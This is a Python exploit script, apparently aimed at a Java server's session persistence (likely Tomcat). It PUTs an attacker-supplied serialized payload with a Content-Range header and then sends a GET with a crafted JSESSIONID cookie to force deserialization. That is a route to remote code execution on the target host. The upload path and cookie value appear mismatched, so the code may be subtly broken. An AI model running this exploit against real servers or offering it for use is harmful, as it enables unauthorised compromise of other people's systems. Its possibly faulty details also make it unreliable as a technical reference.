import http.client
import base64
import argparse

def main():
    parser = argparse.ArgumentParser(description="Send serialized session payload via PUT, then trigger via GET.")
    parser.add_argument("--host", required=True, help="Target host, e.g. 192.168.137.132")
    parser.add_argument("--port", type=int, default=8080, help="Target port (default: 8080)")
    parser.add_argument("--base64-payload", required=True, help="Base64-encoded serialized session data")
    parser.add_argument("--session-id", default=".deserialize", help="JSESSIONID value (default: .deserialize)")
    args = parser.parse_args()

    host = args.host
    port = args.port
    session_id = args.session_id

    try:
        payload = base64.b64decode(args.base64_payload)
    except Exception as e:
        print("[!] Failed to decode base64 payload:", e)
        return

    # 1. Send PUT request
    print("[*] Sending PUT request with serialized session data...")
    conn = http.client.HTTPConnection(host, port)
    put_headers = {
        "Host": f"{host}:{port}",
        "Content-Length": str(len(payload)),
        "Content-Range": f"bytes 0-{len(payload)-1}/{len(payload)}"
    }
    conn.request("PUT", f"/{session_id}/session", body=payload, headers=put_headers)
    put_response = conn.getresponse()
    print(f"[PUT] Status: {put_response.status} {put_response.reason}")
    print(put_response.read().decode(errors="ignore"))
    conn.close()

    # 2. Send GET request to trigger deserialization via session
    print("[*] Sending GET request with session cookie...")
    conn = http.client.HTTPConnection(host, port)
    get_headers = {
        "Host": f"{host}:{port}",
        "Cookie": f"JSESSIONID=.{session_id}"
    }
    conn.request("GET", "/", headers=get_headers)
    get_response = conn.getresponse()
    print(f"[GET] Status: {get_response.status} {get_response.reason}")
    print(get_response.read().decode(errors="ignore"))
    conn.close()

if __name__ == "__main__":
    main()